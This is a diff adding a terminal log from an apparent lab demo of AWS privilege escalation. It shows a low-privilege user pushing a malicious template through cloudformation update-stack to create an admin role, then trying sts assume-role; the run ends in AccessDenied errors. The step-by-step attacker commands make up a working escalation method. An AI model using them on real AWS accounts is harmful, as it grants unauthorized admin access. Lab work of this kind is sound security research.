@@ -1,0 +1,108 @@
+[0;32m========================================[0m
+[0;32mCloudFormation UpdateStack Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-cloudformation-002-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+Resource Suffix: 66pzel
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-cloudformation-002-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-cloudformation-002-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Inspecting the existing CloudFormation stack[0m
+Stack name: pl-prod-cloudformation-002-to-admin-stack
+
+Stack details:
+[2m[ReadOnly] $ aws cloudformation describe-stacks --region us-east-1 --stack-name pl-prod-cloudformation-002-to-admin-stack --query 'Stacks[0].[StackName,StackStatus,Description]' --output table[0m
+---------------------------------------------------------------------
+|                          DescribeStacks                           |
++-------------------------------------------------------------------+
+|  pl-prod-cloudformation-002-to-admin-stack                        |
+|  CREATE_COMPLETE                                                  |
+|  Initial benign template for CloudFormation UpdateStack scenario  |
++-------------------------------------------------------------------+
+
+Current stack template (benign - just creates an S3 bucket):
+[2m[ReadOnly] $ aws cloudformation get-template --region us-east-1 --stack-name pl-prod-cloudformation-002-to-admin-stack --query 'TemplateBody' --output text[0m
+2010-09-09	Initial benign template for CloudFormation UpdateStack scenario
+BUCKETNAME	Name of the initial S3 bucket
+VALUE	InitialBucket
+INITIALBUCKET	AWS::S3::Bucket
+PROPERTIES	pl-cfn-002-admin-bucket-697683661464-66pzel
+TAGS	Name	pl-cfn-002-admin-bucket
+TAGS	Environment	prod
+TAGS	Scenario	cloudformation-updatestack
+TAGS	Purpose	initial-benign-resource
+[0;32m✓ Stack contains benign resources (S3 bucket)[0m
+
+[1;33mStep 6: Creating malicious CloudFormation template[0m
+Creating template that adds an admin role we can assume...
+Malicious template saved to: /tmp/malicious-stack-template.json
+
+Template adds:
+  - EscalatedAdminRole: IAM role with AdministratorAccess
+  - Trust policy allows: pl-prod-cloudformation-002-to-admin-starting-user to assume the role
+[0;32m✓ Malicious template created[0m
+
+[1;33mStep 7: Updating CloudFormation stack with malicious template[0m
+Using cloudformation:UpdateStack permission...
+Stack will use its admin service role to create the escalated role
+
+
+[0;36m[Attacker] $ aws cloudformation update-stack --region us-east-1 --stack-name pl-prod-cloudformation-002-to-admin-stack --template-body file:///tmp/malicious-stack-template.json --capabilities CAPABILITY_NAMED_IAM[0m
+{
+    "StackId": "arn:aws:cloudformation:us-east-1:123456789012:stack/pl-prod-cloudformation-002-to-admin-stack/6f720c30-3a3c-11f1-905f-0affc9a8a8a7",
+    "OperationId": "28f5edc8-2d2a-493f-aa69-8ac513e8d479"
+}
+[0;32m✓ Stack update initiated[0m
+
+[1;33mWaiting for stack update to complete...[0m
+[0;32m✓ Stack update completed[0m
+
+[1;33mWaiting 15 seconds for IAM role to propagate...[0m
+[0;32m✓ IAM role propagated[0m
+
+[1;33mStep 8: Verifying escalated role was created[0m
+Role ARN: arn:aws:iam::123456789012:role/pl-prod-cloudformation-002-to-admin-escalated-role
+[2m[ReadOnly] $ aws iam get-role --role-name pl-prod-cloudformation-002-to-admin-escalated-role[0m
+[0;32m✓ Escalated role exists[0m
+
+[1;33mStep 9: Assuming the escalated admin role[0m
+Using sts:AssumeRole to get admin credentials...
+
+
+[0;36m[Attacker] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-cloudformation-002-to-admin-escalated-role --role-session-name escalation-demo-session --query 'Credentials' --output json[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: 
+[0;31mError: Failed to assume escalated role[0m
+
+[1;33m[demo_permissions] Script interrupted, restoring permissions...[0m
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-cloudformation-002-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+Waiter StackUpdateComplete failed: An error occurred (AccessDenied): User: arn:aws:iam::123456789012:user/pl-prod-cloudformation-002-to-admin-starting-user is not authorized to perform: cloudformation:DescribeStacks on resource: arn:aws:cloudformation:us-east-1:123456789012:stack/pl-prod-cloudformation-002-to-admin-stack/6f720c30-3a3c-11f1-905f-0affc9a8a8a7 with an explicit deny in an identity-based policy
+
+An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::123456789012:user/pl-prod-cloudformation-002-to-admin-starting-user is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::123456789012:role/pl-prod-cloudformation-002-to-admin-escalated-role
+Unable to locate credentials. You can configure credentials by running "aws configure".
